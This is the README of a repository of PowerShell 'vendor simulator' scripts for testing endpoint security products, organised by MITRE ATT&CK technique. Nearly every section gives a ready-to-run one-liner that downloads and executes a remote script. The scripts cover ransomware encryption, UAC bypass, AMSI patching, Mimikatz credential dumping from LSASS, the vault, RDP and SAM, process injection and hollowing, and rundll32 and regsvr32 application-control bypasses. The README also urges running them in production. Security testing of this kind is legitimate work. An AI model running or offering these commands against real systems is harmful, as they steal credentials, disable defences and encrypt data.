# Vendor Simulator Test Scripts

I decided to create the following repository of scripts that can be executed on production environment.
Many customers are using different BAS products with the intention to validate existing EDR vendors.
BAS products can be expensive and hard to comprehend. They also operate within the concept of IOC in mind and mostly do not trigger attack events.

The scripts are created with a mission to validate the prevention capabilities of existing endpoint security solutions.
In most cases, i tried to focus on stealthy and advanced behaviour.

The scripts can be executed on production envirenmnet. 

Please note that many of the scripts will not run unless AMSI is bypassed - every script is a different component of an attack chain and have to be viewed as part of a bigger picture

## Ransomware techniques:
Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.
https://attack.mitre.org/techniques/T1486/

### Encryption  

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\Test';`

### Decryption  

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Decrypt -Path 'C:\Test';`

## User Account Control Bypass (UAC) 
Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation.
https://attack.mitre.org/techniques/T1548/002/

### 1. FodHelper

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC1.ps1"); Invoke-FodHelper;`

### 2. ComputerDefaults

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC2.ps1"); Invoke-ComputerDefaults;`

## Antimalware Scan Interface (AMSI) 
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.
Patching Antimalware Scan Interface (AMSI) becomes part of almost every attack with intention to tamper visibility into script execution

https://attack.mitre.org/techniques/T1562/001/

### 1. AmsiScanBuffer

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-Am51Byp455;`

### 2. DllCanUnloadNowAddress (AmsiScanBuffer) Evasive
A more evasive variant that also identifies AmsiScanBuffer function through a method called egg hunting

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI2.ps1"); Invoke-bypass2;`


## Credentials Theft
Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system,depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.
https://attack.mitre.org/techniques/T1555/

### 1. Lsass logon passwords

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-M1m1k47z -DumpCreds;`

### 2. Browser Vault credential theft

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-M1m1k47z -Command "vault::list";`

### 3. Remote Desktop credentials theft
Recently was added to Mimikatz, the assumption is that the target commputer connects through RDP to some other computer at the moment of theft of those credentials. 

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-M1m1k47z -Command "ts::mstsc"`

### 4. Security Account Manager credentials theft
Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.
Enumerating the SAM database requires SYSTEM level access - you need to execute powershell as administrator - the mimikatz command already tries to elevate to system.
https://attack.mitre.org/techniques/T1003/002/

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-M1m1k47z -Command "token::elevate lsadump::sam"`

## OS Credential Dumping: LSASS Memory
Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.
As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

https://attack.mitre.org/techniques/T1003/001/

### 1. Comsvcs lsass dump 
Built-in Windows tools such as comsvcs.dll can be used to dump lsass

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-LsassDump1.ps1"); Invoke-LsassDump1;`

## Injection
Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

https://attack.mitre.org/techniques/T1055/

### 1. Shellcode Entry Injection
Injection of shellcode into the entry of a legitimate spawn process
In this example we will inject shellcode into notepad that spawns calculator

** Unfortunately MITRE doesn't have a technique mapping to shellcode injection, nevertheless its one of the popular evasion techniques **

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`

### 2. Shellcode Import Address Table Execution
Iteration through process environment block while searching ntdll "openprocess" system call from within the import of kernelbase.dll (legitimate core dll)

** Unfortunately MITRE doesn't have a technique mapping to shellcode execution, nevertheless its one of the popular evasion techniques **

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-IAT-Shellcode.ps1"); Invoke-IAT-Shellcode;`


### 3. Hollowing
Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 
Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. In this example we will hollow legitimate windows msbuild 64 bit process with Mimikatz process 

https://attack.mitre.org/techniques/T1055/012/

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Hollowing64.ps1"); Invoke-Hollow64;`

### 4. Reflective PE Injection
In this example we will reflectively load a simple MsgBox dll within a remote process (the dll is 64bit), 
Reflective loading allows to load a full executable in a legitimate application while bypassing image load monitoring
This also allows to load executable that is not on the disk. We will use the known PowerSploit PE injection.

https://attack.mitre.org/techniques/T1620/

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ReflectivePEInjection.ps1"); Invoke-ReflectivePEInjection -ProcName explorer;`

### 5. RunPE Injection
Similar to Process hollowing with one very important difference, the injection of the executable is done locally within the same process while bypassing EDR solutions,
Many times implemented as part of advanced malwares such as RAT to evade detection and as part of custom packer.

https://attack.mitre.org/techniques/T1620/

`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RunPE.ps1");Invoke-RunPE;`


## Allowlist Bypass (formerly Whitelist bypass)
"Living-off-the-land" techniques that can be used to bypass Application Whitelisting Protection, usually maintain stealthiness and evasion by abusing inherent architectural weakness of the operating system.

### 1. Rundll32 RunHTMLApplication 

Adversaries abuse Rundll32 to execute JavaScript and VBScript codes without downloading scripts.
Due to architectural weakness within the rundll32 loading process, rundll32 can be misused to not only load DLLs, but also to execute a direct Javascript or VBScript code.

**note that this command line is executed from a command-prompt**

https://attack.mitre.org/techniques/T1218/011/

`CMD> rundll32.exe vbscript:"\..\\mshtml, RunHTMLApplication "+Close(CreateObject("WScript.Shell").Run("calc"))`

### 2. Regsvr32 "Squiblydoo" 
 Regsvr32.exe (Microsoft signed binary) can be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web Server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique  is often referred to as "Squiblydoo" attack and has been used in campaigns targeting governments.

https://attack.mitre.org/techniques/T1218/010/

`PS> regsvr32.exe /u /s /i:https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/calc.txt scrobj.dll`

